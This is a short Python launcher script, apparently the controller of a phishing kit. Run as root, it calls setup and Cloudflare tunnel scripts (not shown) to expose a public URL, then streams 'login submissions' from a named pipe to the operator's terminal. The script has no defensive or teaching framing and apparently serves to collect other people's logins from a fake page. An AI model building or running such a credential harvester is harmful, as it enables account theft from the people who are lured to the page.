#!/usr/bin/env python3
import subprocess, os, sys, time, select

SETUP = "./setup.sh"
CF = "./cloudflare.sh"
STOP = "./stop.sh"
FIFO = "/tmp/login_fifo"

if os.geteuid() != 0:
    print("Run as root: sudo python3 main.py")
    sys.exit(1)

def run_setup():
    subprocess.check_call(["bash", SETUP])

def start_cloudflared():
    result = subprocess.run(["bash", CF], capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if line.startswith("CLOUDFLARE_URL="):
            url = line.split("=", 1)[1]
            print(f"\nPublic URL: {url}\n")
            break

def stop_all():
    subprocess.call(["bash", STOP])

def read_fifo():
    print("--- Waiting for login submissions ---\n")
    with open(FIFO, "r") as f:
        while True:
            line = f.readline()
            if line:
                print(line, end="")

def main():
    try:
        run_setup()
        start_cloudflared()
        read_fifo()
    except KeyboardInterrupt:
        stop_all()

if __name__ == "__main__":
    main()
